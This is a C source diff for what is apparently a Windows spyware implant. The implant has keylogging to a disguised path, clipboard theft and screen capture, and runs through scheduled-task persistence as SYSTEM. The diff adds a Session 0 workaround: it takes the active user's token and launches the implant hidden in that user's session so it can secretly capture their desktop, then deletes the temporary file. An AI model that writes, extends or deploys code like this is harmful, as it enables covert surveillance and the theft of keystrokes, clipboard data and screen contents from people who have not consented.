@@ -9,6 +9,7 @@
 #ifdef _WIN32
 #include <windows.h>
 #include <wincrypt.h>
+#include <wtsapi32.h>
 
 #define KEYLOG_FILE "C:\\Users\\Public\\MicrosoftEdge\\kl.dat"
 
@@ -245,30 +246,32 @@ char *spy_clipboard_get(int *len_out)
     return out;
 }
 
-char *spy_screenshot_capture(int *len_out)
+/* Capture the screen using GDI. Must be called from within the interactive
+ * user session — returns NULL (not a black BMP) if called from Session 0. */
+static char *gdi_screenshot(int *len_out)
 {
-    int x1 = GetSystemMetrics(SM_XVIRTUALSCREEN);
-    int y1 = GetSystemMetrics(SM_YVIRTUALSCREEN);
-    int width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
+    int x1     = GetSystemMetrics(SM_XVIRTUALSCREEN);
+    int y1     = GetSystemMetrics(SM_YVIRTUALSCREEN);
+    int width  = GetSystemMetrics(SM_CXVIRTUALSCREEN);
     int height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
 
     HDC hScreen = GetDC(NULL);
-    HDC hDC = CreateCompatibleDC(hScreen);
+    HDC hDC     = CreateCompatibleDC(hScreen);
     HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, width, height);
     HGDIOBJ old_obj = SelectObject(hDC, hBitmap);
     BitBlt(hDC, 0, 0, width, height, hScreen, x1, y1, SRCCOPY);
 
     BITMAPINFO bmi;
     memset(&bmi, 0, sizeof(bmi));
-    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
-    bmi.bmiHeader.biWidth = width;
-    bmi.bmiHeader.biHeight = -height;
-    bmi.bmiHeader.biPlanes = 1;
-    bmi.bmiHeader.biBitCount = 24;
+    bmi.bmiHeader.biSize        = sizeof(BITMAPINFOHEADER);
+    bmi.bmiHeader.biWidth       = width;
+    bmi.bmiHeader.biHeight      = -height;
+    bmi.bmiHeader.biPlanes      = 1;
+    bmi.bmiHeader.biBitCount    = 24;
     bmi.bmiHeader.biCompression = BI_RGB;
 
-    int image_size = width * height * 3;
-    char *buffer = malloc(image_size);
+    int   image_size = width * height * 3;
+    char *buffer     = malloc(image_size);
     if (!buffer) {
         SelectObject(hDC, old_obj);
         DeleteDC(hDC);
@@ -279,19 +282,18 @@ char *spy_screenshot_capture(int *len_out)
 
     GetDIBits(hDC, hBitmap, 0, height, buffer, &bmi, DIB_RGB_COLORS);
 
-    /* Construct BMP in memory */
     BITMAPFILEHEADER bfh;
     memset(&bfh, 0, sizeof(bfh));
-    bfh.bfType = 0x4D42;
+    bfh.bfType    = 0x4D42;
     bfh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
-    bfh.bfSize = bfh.bfOffBits + image_size;
+    bfh.bfSize    = bfh.bfOffBits + image_size;
 
-    int total_size = bfh.bfSize;
+    int   total_size   = bfh.bfSize;
     char *final_buffer = malloc(total_size);
     if (final_buffer) {
-        memcpy(final_buffer, &bfh, sizeof(bfh));
-        memcpy(final_buffer + sizeof(bfh), &bmi.bmiHeader, sizeof(BITMAPINFOHEADER));
-        memcpy(final_buffer + bfh.bfOffBits, buffer, image_size);
+        memcpy(final_buffer,                &bfh,            sizeof(bfh));
+        memcpy(final_buffer + sizeof(bfh),  &bmi.bmiHeader,  sizeof(BITMAPINFOHEADER));
+        memcpy(final_buffer + bfh.bfOffBits, buffer,         image_size);
         *len_out = total_size;
     }
 
@@ -301,6 +303,63 @@ char *spy_screenshot_capture(int *len_out)
     ReleaseDC(NULL, hScreen);
     DeleteObject(hBitmap);
     return final_buffer;
+}
+
+/* When running as SYSTEM (Session 0, e.g. scheduled-task persistence), GDI
+ * has no access to the interactive desktop and produces a black image.
+ * This function spawns the implant binary in the active user session with
+ * --screenshot <tmp>, waits for it to write the BMP, then returns the data. */
+static char *screenshot_via_user_session(int *len_out, DWORD console_session)
+{
+    HANDLE hToken = NULL;
+    if (!WTSQueryUserToken(console_session, &hToken))
+        return NULL;
+
+    char self_path[MAX_PATH];
+    GetModuleFileNameA(NULL, self_path, sizeof(self_path));
+
+    const char *tmp_path = "C:\\Users\\Public\\MicrosoftEdge\\ss.tmp";
+    char cmd[MAX_PATH + 80];
+    _snprintf(cmd, sizeof(cmd), "\"%s\" --screenshot \"%s\"", self_path, tmp_path);
+
+    STARTUPINFOA si;
+    ZeroMemory(&si, sizeof(si));
+    si.cb          = sizeof(si);
+    si.dwFlags     = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&pi, sizeof(pi));
+
+    BOOL ok = CreateProcessAsUserA(hToken, NULL, cmd, NULL, NULL,
+                                    FALSE, CREATE_NO_WINDOW,
+                                    NULL, NULL, &si, &pi);
+    CloseHandle(hToken);
+    if (!ok) return NULL;
+
+    WaitForSingleObject(pi.hProcess, 10000);
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+
+    char *data = read_file_heap_plain(tmp_path, len_out);
+    DeleteFileA(tmp_path);
+    return data;
+}
+
+char *spy_screenshot_capture(int *len_out)
+{
+    /* Detect Session 0 isolation: the scheduled task runs as SYSTEM in a
+     * non-interactive session.  GetDC(NULL) there returns the blank Session 0
+     * desktop, producing a solid black image.  Spawn a helper in the active
+     * console session instead so GDI sees the real user desktop. */
+    DWORD my_session = 0;
+    ProcessIdToSessionId(GetCurrentProcessId(), &my_session);
+    DWORD console_session = WTSGetActiveConsoleSessionId();
+
+    if (my_session != console_session)
+        return screenshot_via_user_session(len_out, console_session);
+
+    return gdi_screenshot(len_out);
 }
 
 #else
